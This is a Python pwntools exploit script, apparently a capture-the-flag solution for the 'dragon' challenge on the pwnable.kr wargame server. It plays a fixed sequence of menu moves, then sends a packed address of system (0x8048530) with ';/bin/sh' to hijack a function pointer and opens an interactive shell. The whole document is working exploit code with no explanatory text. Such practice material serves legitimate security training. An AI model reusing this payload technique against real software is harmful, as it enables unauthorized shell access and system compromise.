#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

# imports
from pwn import *
import time

context.log_level = 'debug'

#p = process("./dragon")
p = remote("pwnable.kr",9004)

print p.recvuntil("Knight\n")

#It's an interesting challenge anyway~
p.sendline("2")
time.sleep(0.5)
print p.recvuntil("HP.\n")

p.sendline("2")
time.sleep(0.5)
print p.recvuntil("Knight\n")

p.sendline("1") #here starts.
print p.recvuntil("cible.\n")

for i in range(3):
    p.sendline("3")
    print p.recvuntil("cible.\n")
    p.sendline("3")
    print p.recvuntil("cible.\n")
    p.sendline("2")
    print p.recvuntil("cible.\n")

p.sendline("3")
print p.recvuntil("cible.\n")
p.sendline("3")
print p.recvuntil("cible.\n")
p.sendline("2")
print p.recvuntil("As:\n")
system = 0x8048530

p.send(p32(system) + ";/bin/sh")
p.interactive()

